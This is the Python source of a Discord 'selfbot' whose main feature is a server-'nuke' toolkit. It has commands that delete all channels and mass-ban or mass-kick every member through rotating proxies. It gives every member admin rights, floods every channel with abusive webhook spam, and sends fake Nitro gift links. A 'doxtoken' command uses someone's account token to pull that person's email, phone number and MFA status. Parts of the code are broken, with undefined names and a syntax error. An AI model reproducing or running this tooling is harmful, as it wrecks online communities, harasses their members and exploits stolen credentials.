import os
import json
import string
import base64
import discord, aiohttp
from discord.ext import commands, tasks
from discord import Permissions
import requests
from colorama import Fore
import asyncio
import requests
import logging
import sys
import random
from random import randint
from threading import Thread
import threading
import subprocess
import requests
import time
import datetime
from time import sleep
from discord import Color, Embed
import colorama
from colorama import Fore, Style
import urllib.parse
import urllib.request
import re
import io
from itertools import cycle
from requests_futures.sessions import FuturesSession
import webbrowser

colorama.init()

intents = discord.Intents.default()
intents.guilds = True
intents.typing = True
intents.presences = True
intents.dm_messages = True
intents.messages = True
intents.members = True

client = commands.Bot(description='THIS SELFBOT IS CREATED BY STEVE PAPA', command_prefix='>', self_bot=True, intents=intents)
header = {"Authorization": f'Bot {"Token"}'}

stream_url = "https://replit.com/@WannaBeGhost"
Token = "ACCOUNT TOKEN"

#NUKE HELP COMMAND
@client.command()
async def nukehelp(ctx):
    nukehelp = (f"**╭・⌬・__STEVE PAPA SELFBOT__**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n\n**[ __NUKE COMMANDS__... ]**\n\n**[>]・ `RS` **\n**[>]・ `WSPAM` **\n**[>]・`PINGS` **\n**[>]・ `BAN` **\n**[>]・ `KICK` **\n**[>]・ `ADMINALL` **\n**[>]・ `ADMINSERVERS` **\n**[>]・ `DC` **\n**[>]・ `NICKALL` **\n**[>]・ `MASSUNBAN`  **\n**[>]・ `MR` **\n**[>]・ `MC` **\n**[>]・ `BAN²` **\n**[>]・ `MASSROLES²` **\n**[>]・ `MASSBAN` **\n**[>]・ `MASSKICK` **\n**[>]・ `KICK²`  **\n**[>]・ `PRUNE` **\n**[>]・ `SWIZZ`  **\n**[>]・ `PWIZZ` **\n**[>]・ `TOKENINFO`  **\n\n**・` TYPE [HELP] FOR NORMAL COMMANDS...` **\n\n**[>]・__Request creator__ : `{client.user.name}`**\n**[>]・__This SelfBot Is Created By__ - __STEVE PAPA__**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )
    await ctx.send(nukehelp)
    print(f"{Fore.GREEN}[>] NUKE HELP SENT SUCCESSFULLY ")
    await ctx.message.delete()


#HELP COMMAND
@client.command()
async def Help(ctx):
    message = (
        f"**╭・⌬・__STEVE PAPA SELFBOT__**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n\n**[ __HELP COMMANDS__... ]**\n\n**[>]・ `BANNER` **\n**[>]・ `VOUCH` **\n**[>]・ `STREAM` **\n**[>]・ `WATCH` **\n**[>]・ `LISTEN` **\n**[>]・ `PLAY` **\n**[>]・ `STOPACTIVITY` **\n**[>]・ `LINK` **\n**[>]・ `SPAM` **\n**[>]・ `DMALL` **\n**[>]・ `MASSREACT` **\n**[>]・ `BOOST` **\n**[>]・ `INFO` **\n**[+]・ `YTSEARCH` **\n**[>]・ `CHECKPROMO` **\n**[>]・ `WIFE` **\n**[>]・ `LOCK` **\n**[>]・ `GUILDICON` **\n**[>]・ `PURGE` **\n**[>]・ `PREFIX` **\n**[>]・ `NITRO` **\n**[>]・ `JOINVC` **\n\n**・`TYPE [NUKEHELP] IN LOWERCASE FOR NUKE COMMANDS...` **\n\n**[>]・__Request creator__ : `{client.user.name}`**\n**[>]・__This SelfBot Is Created by__ - __STEVE PAPA__**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )
    await ctx.send(message)
    print(f"{Fore.GREEN}[>] HELP SENT SUCCESSFULLY  ")
    await ctx.message.delete()

@client.event
async def on_ready():
    print(f"""{Fore.RED}

░██████╗████████╗███████╗██╗░░░██╗███████╗
██╔════╝╚══██╔══╝██╔════╝██║░░░██║██╔════╝
╚█████╗░░░░██║░░░█████╗░░╚██╗░██╔╝█████╗░░
░╚═══██╗░░░██║░░░██╔══╝░░░╚████╔╝░██╔══╝░░
██████╔╝░░░██║░░░███████╗░░╚██╔╝░░███████╗
╚═════╝░░░░╚═╝░░░╚══════╝░░░╚═╝░░░╚══════╝

██████╗░░█████╗░██████╗░░█████╗░
██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██████╔╝███████║██████╔╝███████║
██╔═══╝░██╔══██║██╔═══╝░██╔══██║
██║░░░░░██║░░██║██║░░░░░██║░░██║
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝""")
    print(f'{Fore.BLUE}╭・⌬・ [>] CONNECTED TO : {client.user.name}')
    print('ㅤㅤㅤㅤㅤ')
    print('[<<<<<==============-|-==============>>>>>]')
    print('ㅤㅤㅤㅤㅤ')
    print(f'{Fore.RED}-  JAI SHREE RAM')
    print('ㅤㅤㅤㅤㅤ')
    border_top = '╔════════════════════════════════════════════════════════════════════╗'
    border_bottom = '╚════════════════════════════════════════════════════════════════════╝'
    
    print(border_top)
    print(f'║{Fore.YELLOW}[>] YOU CAN CONTACT ME HERE FOR ANY SUPPORT :{" "*(68-len("[>] YOU CAN CONTACT ME HERE FOR ANY SUPPORT :"))}║')
    print(f'║{" "*(68)}║')
    print(f'║{Fore.GREEN}• YOUTUBE   : *HOGA KUCH*{" "*(68-len("• YOUTUBE   : *HOGA KUCH*"))}║')
    print(f'║• INSTAGRAM : *NHI CHALATA*{" "*(68-len("• INSTAGRAM : *NHI CHALATA*"))}║')
    print(f'║• DISCORD   : @steve_sp1it{" "*(68-len("• DISCORD   : @steve_sp1it"))}║')
    print(border_bottom)
    print(border_top)
    print(f'{Fore.RED}║>>>>> STEVE PAPA ON TOP BXBY <3{" "*(42-len(">>>>> STEVE PAPA ON TOP BXBY <3"))}{Fore.YELLOW}║║║║║║║║║  --  ║║║║║║║║║║║{Fore.BLUE}')
    print(border_bottom)
    print('ㅤㅤㅤㅤㅤ')
    print('ㅤㅤㅤㅤㅤ')
    print(
        f'{Fore.GREEN}[>]------------{Fore.BLUE}======================{Fore.RED}] | [{Fore.BLUE}======================={Fore.GREEN}------------[<]')
    print('ㅤㅤㅤㅤㅤ')
    print('ㅤㅤㅤㅤㅤ')

#CONFIG
def load_config(config_file_path):
    with open(config_file_path, 'r') as config_file:
        config = json.load(config_file)
    return config

if __name__ == "__main__":
    config_file_path = "config.json" 
    config = load_config(config_file_path)
  
#=== EDIT THEM ON CONFIG ===
prefix = config.get("prefix")
CHANNEL_NAMES = config.get("CHANNEL_NAMES")
VCHANNELS_NAMES = config.get("VCHANNELS_NAMES")
CATEGORY_NAMES = config.get("CATEGORY_NAMES")
ROLE_NAMES = config.get("ROLE_NAMES")
Webhook_contents = config.get("Webhook_contents")
Twitch_URL = config.get("Twitch_URL")
SERVER_LINK = config.get("SERVER_LINK")
#===================================


#WATCHING
@client.command()
async def watch(ctx, *, message):
    await ctx.message.channel(f"**STREAMING {message}**")
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.watching), name=message))


#PLAYING
@client.command()
async def play(ctx, *, message):
    await ctx.message.channel(f"**PLAYING {message}**")
    game = discord.Game(name=message)
    await client.change_presence(activity=game)


#LISTENING
@client.command()
async def listen(ctx, *, message):
    await ctx.message.channel(f"**LISTENING TO {message}**")
    await client.change_presence(activity=discord.Activity(
        type=(discord.ActivityType.listening), name=message))


#STREAMING
@client.command()
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(name=message,
                               url='https://www.twitch.tv/SparkYSelfbot')
    await client.change_presence(activity=stream)


#BOOST
@client.command()
async def boost(channel, guild):
    await channel.send(
        f"**╭・⌬・** __**{guild.name}**__\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[>]・Server has :** `{guild.premium_subscription_count} BOOSTS`\n**[>]・Request creator : **`{client.user.name}`\n**[>]・__STEVE PAPA SELFBOT__**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )


#SELFBOT INFO
@client.command()
async def selfbot(channel):
    await channel.send(
        f"**╭・⌬・STEVE PAPA SELFBOT**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[>]・Version : SELFBOT V3**\n**[+]・ Language : Python**\n**[>]・ Hosted at : Termux**\n**[>]・Request creator : {client.user.name}**\n\n**NOTE :** `THIS SELFBOT IS STILL UNDER DEVELOPMENT, I DON'T HAVE MUCH TIME RN BUT I WILL SURELY ADD MORE CMDS SOON`\n\n**[>]・__This SelfBot Is Created by - STEVE PAPA__ **\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )


#VOUCH
async def vouch(channel):
    await channel.send(
        f"**╭・⌬・STEVE PAPA SELFBOT**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[>]・ `SERVER LINK` : `https://discord.gg/sp1it`**\n**[+]・ `VOUCH FORMAT` \n`+vouch (user) Legit Got (product) For (price) Thank You`**\n\n**[+]・Request creator : {client.user.name}**\n\n**[+]・__This SelfBot Is Created by - STEVE PAPA__ **\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )
    await channel.message.delete()


#LINK
@client.command()
async def link(channel):
    await channel.send("- `https://discord.gg/sp1it`")


#NITRO GEN
@client.command(aliases=["nitrogen"])
async def nitro(ctx):
    try:
        await ctx.message.delete()
        code = ''.join(
            random.choices(string.ascii_letters + string.digits, k=16))
        await ctx.send(f'https://discord.gift/{code}')
        print(f"{Fore.GREEN}[>] SUCCESFULLY SENT NITRO CODE !")
    except Exception as e:
        print(f"{Fore.RED}[!] ERROR: {str(e)}")
    await asyncio.sleep(2)


#NSFW
@client.command(aliases=['fuck', 'chudai', '18+', 'xxx', 'nsfw'])
async def wife(ctx):
    try:
        response = requests.get('https://api.waifu.pics/nsfw/waifu')
        data = response.json()
        if 'url' in data:
            image_url = data['url']
            await ctx.message.delete()
            await ctx.send(image_url)
        else:
            await ctx.send('- `[>] ERROR FINDING ANIME GIRLLL`')
            print(f"{Fore.GREEN}[>] WIFE SENT SUCCESSFUL")
    except Exception as e:
        print('- `[>] ERROR WHILE FETCHING IT`', e)
    await asyncio.sleep(2)


#PROMO CHECK
@client.command()
async def checkpromo(ctx, *, promo_links):
    links = promo_links.split('\n')

    async with aiohttp.ClientSession() as session:
        for link in links:
            promo_code = extract_promo_code(link)
            if promo_code:
                result = await check_promo(session, promo_code)
                await ctx.send(result)
            else:
                await ctx.send(f'- `INAVLID PROMO{link}`')

async def check_promo(session, promo_code):
    url = f'https://ptb.discord.com/api/v10/entitlements/gift-codes/{promo_code}'

    async with session.get(url) as response:
        if response.status in [200, 204, 201]:
            data = await response.json()
            if data["uses"] == data["max_uses"]:
                return f'- `ALREADY CLAIMED {promo_code}`'
            else:
                try:
                    now = datetime.datetime.utcnow()
                    exp_at = data["expires_at"].split(".")[0]
                    parsed = parser.parse(exp_at)
                    days = abs((now - parsed).days)
                    title = data["promotion"]["inbound_header_text"]
                except Exception as e:
                    print(e)
                    exp_at = "- `FAILED TO FETCH`"
                    days = ""
                    title = "- `FAILED TO FETCH`"
                return f'- `VALID {promo_code} | DAYS LEFT IN EXPIRATION {days} | EXPIRES AT {exp_at} | TITLE :{title}`'
        elif response.status == 429:
            return f'- `RATE LIMITED{response.headers["RETRY AFTER"]} SECONDS`'
        else:
            return f'- `INVALID : {promo_code}`'

def extract_promo_code(promo_link):
    promo_code = promo_link.split('/')[-1]
    return promo_code


#DM ALL
@client.command()
async def dmall(ctx, *, message):
    for user in client.user.friends:
        try:
            await user.send(message)
            print(f"messaged: {user.name}")
        except:
            print(f"couldnt message: {user.name}")


#MASS REACT
@client.command()
async def massreact(ctx, emote):
    await ctx.message.delete()
    await asyncio.sleep(2)
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)
        await asyncio.sleep(2)


#SERVER BANNER
@client.command(aliases=['serverbanner'])
async def banner(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"- `{ctx.guild.name} SERVER HAS NO BANNER`")
        return
    await ctx.send(ctx.guild.banner_url)
    print(f"{Fore.GREEN}[>] MAREACT  SUCCESSFUL")


#SERVER INFO.
@client.command()
async def serverinfo(channel):
    guild = channel.guild
    await channel.send(
        f"**╭・⌬・STEVE PAPA SELFBOT**\n\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[>]・ `SERVER NAME` : {guild.name}**\n**[>]・ `GUILD ID` : {guild.id}**\n**[>]・ `CREATED AT` : {channel.guild.created_at}**\n**[>]・ `OWNED BY` : <@{guild.owner_id}>**\n**[>]・ `REIGON` : {guild.region}**\n\n**[>]・Request creator : {client.user.name}**\n\n**[>]・__This SelfBot Is Created by - STEVE PAPA__ **\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**"
    )


#SERVER PFP
@client.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"- `{ctx.guild.name} SERVER HAS NO ICON`")
        return
    await ctx.send(ctx.guild.icon_url)
    print(f"{Fore.GREEN}[>] GUILDICON SENT  SUCCESSFUL")


#SERVER RENAME
@client.command(aliases=['rs'])
async def renameserver(ctx, *, name):
    await ctx.message.delete()
    await ctx.guild.edit(name=name)
    await asyncio.sleep(2)
    print(f"{Fore.GREEN}[>] SERVER RENAME SUCCESSFULLY")


#WEBHOOK SPAM
def wspam(webhook):
    while spammingdawebhookeroos:
        data = {'content': '@everyone @here FUCKED BY STEVE PAPA `https://discord.gg/sp1it`'}
        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 10
                time.sleep(timetowait)
            except:
                delay = random.randint(2, 10)
                time.sleep(delay)

        else:
            delay = random.randint(2, 10)
            time.sleep(delay)


#WEBHOOK PINGS
@client.command()
async def pings(ctx):
    global spammingdawebhookeroos
    spammingdawebhookeroos = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
          

         if len(ctx.guild.text_channels) >= 50:
            webhookamount = len(ctx.guild.text_channels)
    else:
        webhookamount = 10000 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 2
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='FUCKED BY STEVE PAPA')
                threading.Thread(target=wspam, args=(webhook.url, )).start()
                f = open('data/webhooks-' + str(ctx.guild.id) + '.txt', 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.RED} > Webhook Error")


#BAN
@client.command()
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send('```SUCCESSFULLY BANNED```')
    print(f"{Fore.GREEN}[>] SUCCESSFULLY BANNED")


#KICK
@client.command()
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send('```SUCCESSFULLY KICKED```')
    print(f"{Fore.GREEN}[>] SUCCESSFULLY KICKED")


#ALL ADMIN
@client.command()
async def adminall(ctx):
    await ctx.message.delete()
    await asyncio.sleep(2) 
    guild = ctx.guild
    try:
        role = discord.utils.get((guild.roles), name='@everyone')
        await role.edit(permissions=(Permissions.all()))
        print(Fore.MAGENTA + 'ADMIN SUCCESSFUL' + Fore.RESET)
    except:
        print(Fore.GREEN + 'UNSUCCESSFUL' + Fore.RESET)
    await asyncio.sleep(2)


#CHANNEL LOCK 
@client.command()
async def lock(ctx):
    await ctx.channel.set_permissions((ctx.guild.default_role),
                                      send_messages=False)
    await ctx.send(ctx.channel.mention + 'CHANNEL LOCKED')
    print(f"{Fore.GREEN}[>] CHANNEL LOCKED")


#SERVER ADMINS
@client.command()
async def serveradmin(ctx):
    await ctx.message.delete()
    await asyncio.sleep(2)
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in client.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers +
                   kickPermServers)
    await asyncio.sleep(2)
    print(f"{Fore.GREEN}[>] SHOWN SUCCESSFULLY")


#DELETE CHANNELS
@client.command(aliases=['dc'])
async def deletechannels(ctx):
    await ctx.message.delete()
    await asyncio.sleep(2)
    print(f"{Fore.RED}Deleting Channels . . .")
    for channel in ctx.guild.channels:
        await channel.delete()
    print(f"{Fore.RED} Channels Deleted")


#NICKNAME ALL
@client.command()
async def nickall(ctx, nickname):
    await ctx.message.delete()
    await asyncio.sleep(2) 
    for user in list(ctx.guild.members):
        try:
            await user.edit(nick=nickname)
        except:
            pass
    await asyncio.sleep(2)
    print(f"{Fore.GREEN}[>] NICKNAME SUCCESSFUL")


#MASS UNBAN
@client.command()
async def massunban(ctx):
    await ctx.message.delete()
    await asyncio.sleep(2)
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            print(f"failed to unban")
    await asyncio.sleep(2)
    print(f"{Fore.GREEN}[>] UNBAN SUCCESSFUL")


#MASS ROLES
@client.command(aliases=['mr'])
async def massroles(ctx, amount=50):
    await ctx.message.delete()
    await asyncio.sleep(2)
    roles = ctx.guild.roles
    for roles in roles:
        try:
            print(roles.name + " is edited by STEVE PAPA")
        except:
            pass
            print("error")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_role((ROLE_NAMES)
                                                 )
            print(f"[{i}] MASS ROLES")
        except:
            print(f"ERROR MAKING ROLES")
    await asyncio.sleep(2)


#MASS CHANNELS
@client.command(aliases=['mc'])
async def masschannels(ctx, amount=50):
    await ctx.message.delete()
    await asyncio.sleep(2)
    channels = ctx.guild.channels
    for channel in channels:
        try:
            await channel.delete()
            print(channel.name + "CREATED SUCCESSFUL")
        except:
            pass
            print(f"ERROR")
            guild = ctx.message.guild
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel((CHANNEL_NAMES))
            print(f"[{i}] CHANNELS SUCCESSFUL")
        except:
            print(f"ERROR MAKING CHANNELS")
    await asyncio.sleep(2) 


#MASS BAN v²
@client.command(aliases=['ban2'])
async def massban2(ctx):
    try:
        await ctx.message.delete()
        await asyncio.sleep(2) 
        guild = ctx.guild.id
    except:
        print(f"Connection error.")

    def mass_ban(i):
        r = sessions.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
                         headers=headers,
                         proxies={
                             "http": 'http://' + next(rotating)
                         }).result()

    try:
        for i in range(3):
            for member in list(ctx.guild.members):
                threading.Thread(target=mass_ban, args=(member.id, )).start()
                logging.info(f"Executed member {member}.")
        clear()
        print(f"MASS BAN SUCCESSFUL.")
    except Exception as error:
        print(f"Connection error.")
        await asyncio.sleep(2)


#MASS SPAM
@client.command()
async def spam(ctx, amount: int, delay_ms: float, *, message):
    await ctx.message.delete()
    await asyncio.sleep(1)
    delay_sec = delay_ms / 1000  # mseconds to seconds
    for _i in range(amount):
        await ctx.send(message)
        await asyncio.sleep(delay_sec)
        print(f"{Fore.GREEN}[>] SPAM SUCCESSFUL ")
    await asyncio.sleep(2)


#MASS ROLES v²
@client.command()
async def massroles2(ctx):
    try:
        await ctx.message.delete()
        await asyncio.sleep(2)
        guild = ctx.guild.id
    except:
        logging.info(f"Connection error.")
    def massroles2(i):
        json = {
          "name": i
        }
        r = sessions.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
    for i in range(50):
        threading.Thread(
          target=massroles2,
          args=(random.choice(ROLE_NAMES), )
          ).start()
        print(f"Created channel {random.choice(ROLE_NAMES)}.")

    await asyncio.sleep(15)


#MASS BAN
@client.command()
async def massban(ctx):
    await ctx.message.delete()
    await asyncio.sleep(2)
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="STEVE PAPA AAYE THE")
        except:
            pass
    await asyncio.sleep(2)
    print(f"{Fore.GREEN}[>] MASS BAN SUCCESSFUL")


#MASS KICK
@client.command()
async def masskick(ctx):
    await ctx.message.delete()
    await asyncio.sleep(2)
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="STEVE PAPA AAYE THE")
        except:
            pass
    await asyncio.sleep(2)
    print(f"{Fore.GREEN}[>] MASS KICK SUCCESSFUL ")

#MASSKICK v²
@client.command(aliases=['kick2'])
async def masskick2(ctx):
    try:
        await ctx.message.delete()
        await asyncio.sleep(2)
        guild = ctx.guild.id
    except:
        print(f"Connection error.")

    def mass_kick(i):
        r = sessions.put(f"https://discord.com/api/v9/guilds/{guild}/kick/{i}",
                         headers=headers,
                         proxies={
                             "http": 'http://' + next(rotating)
                         }).result()

    try:
        for i in range(3):
            for member in list(ctx.guild.members):
                threading.Thread(target=mass_kick, args=(member.id, )).start()
        print(f"Executed member {member}.")
        clear()
        print(f"{Fore.GREEN}[>] MASS KICK SUCCESSFUL")
    except Exception as error:
        print(f"{Fore.GREEN}[>] ERROR KICKING ")
        sleep(10)
        await asyncio.sleep(2)


#VC JOINER
@client.command()
async def joinvc(ctx, channel_id: int):
    channel = client.get_channel(channel_id)

    if channel and isinstance(channel, discord.VoiceChannel):
        voice_client = await channel.connect()
        await ctx.send(f"JOINED {channel.name}")
    else:
        await ctx.send("Invalid channel ID or the channel is not a voice channel. Please provide valid channel ID")


#TOKEN CHECKER
@client.command(aliases=['tdox', 'doxtoken'])
async def tokeninfo(ctx, _token):
    
    headers = {'Authorization': _token, 'Content-Type': 'application/json'}
    try:
        res = requests.get(
            'https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        creation_date = datetime.datetime.utcfromtimestamp(
            ((int(user_id) >> 22) + 1420070400000) /
            1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        headers = {
            'Authorization': "Bot" + token,
            'Content-Type': 'application/json'
        }
        try:
            res = requests.get(
                'https://canary.discordapp.com/api/v6/users/@me',
                headers=headers)
            res = res.json()
            user_id = res['id']
            locale = res['locale']
            avatar_id = res['avatar']
            creation_date = datetime.datetime.utcfromtimestamp(
                ((int(user_id) >> 22) + 1420070400000) /
                1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            em = discord.Embed(
                description=
                f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
            )
            fields = [
                {
                    'name': 'Flags',
                    'value': res['flags']
                },
                {
                    'name': 'Local language',
                    'value': res['locale'] + f"errror sex"
                },
                {
                    'name': 'Verified',
                    'value': res['verified']
                },
            ]
            for field in fields:
                if field['value']:
                    em.add_field(
                        name=field['name'], value=field['value'], inline=False)
                    em.set_thumbnail(
                        url=
                        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
                    )
            return await ctx.reply(embed=em, mention_author=True)
        except KeyError:
            await ctx.reply("SELFBOT HAI BACCHE | Invalid Token", mention_author=True)
    em = discord.Embed(
        description=
        f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
    )
    em.set_footer(text="STEVE PAPA")
    nitro_type = "None"
    if "premium_type" in res:
        if res['premium_type'] == 2:
            nitro_type = "Nitro Premium"
        elif res['premium_type'] == 1:
            nitro_type = "Nitro Classic"
    fields = [
        {
            'name': 'Phone',
            'value': res['phone']
        },
        {
            'name': 'Flags',
            'value': res['flags']
        },
        {
            'name': 'Local language',
            'value': res['locale']
        },
        {
            'name': 'MFA',
            'value': res['mfa_enabled']
        },
        {
            'name': 'Verified',
            'value': res['verified']
        },
        {
            'name': 'Nitro',
            'value': nitro_type
        },
    ]
    for field in fields:
        if field['value']:
            em.add_field(
                name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(
                url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
            )
            em.set_footer(text="STEVE PAPA SELFBOT")
    return await ctx.reply(embed=em, mention_author=True)
    print(f"{Fore.GREEN}[>] TOKEN DETAILS SENT SUCCESSFUL")


#1 DAY PRUNE BY STEVE
@client.command()
async def prune(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  try:
            await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)

  except:
            print(f"{Fore:RED}[! ERROR PRUNING ]")


#SWIZZ MIXED NUKE CMDS
@client.command()
async def swizz(ctx):
  await ctx.channel.send(f">rr STEVE PAPA AAGYE RANDIO")
  await asyncio.sleep(2)
  await ctx.channel.send(f">rs SERVER FUCKED BY STEVE PAPA")
  await asyncio.sleep(2)
  await ctx.channel.send(f">rc STEVE PAPA WAS HERE")
  await asyncio.sleep(2)
  print(f"{Fore.GREEN}[>] ALL CMDS SENT SUCCESSFUL")


#PWIZZ ALL NUKE CMDS MIXED
@client.command()
async def pwizz(ctx):
  await asyncio.sleep(2) 
  await ctx.channel.send(f">masschannels2")
  await asyncio.sleep(2) 
  await ctx.channel.send(f">massban2")
  await asyncio.sleep(2) 
  await ctx.channel.send(f">swizz")
  await asyncio.sleep(2) 
  await ctx.channel.send(f">pings")
  await asyncio.sleep(2) 
  await ctx.channel.send(f">spam 1000 2000 @everyone @here  https://discord.gg/sp1it")
  await asyncio.sleep(2)
  print(f"{Fore.GREEN}[>] ALL CMDS SENT SUCCESSFUL")


#YT SEARCH
@client.command()
async def ytsearch(msg, *, search=''):

    if search == '':
        await msg.send('- `PLEASE PROVIDE A VALID REQUEST...`')
    query_string = urllib.parse.urlencode({"search_query": search})
    html_content = urllib.request.urlopen("http://www.youtube.com/results?" +
                                          query_string)
    search_results = re.findall(r"watch\?v=(\S{11})",
                                html_content.read().decode())
    nab = search.replace('@', '')
    await msg.send(
        f"**╭・⌬・STEVE PAPA SELFBOT**\n**●▬▬▬▬▬▬▬▬๑۩✰۩๑▬▬▬▬▬▬▬▬●**\n**[>]・ `SEARCH'S FOR` : `{nab}`**\n**[>]・ `URL` : **http://www.youtube.com/watch?v="
        + search_results[0])
    print(f"{Fore.GREEN}[>] YTSEARCH SUCCESSFUL")


#RESTART
@client.command()
async def restart(ctx):
    await ctx.reply(f"`Restarting...`")
    os.execl(sys.executable, sys.executable, *sys.argv)


client.run(Token ,bot=False)
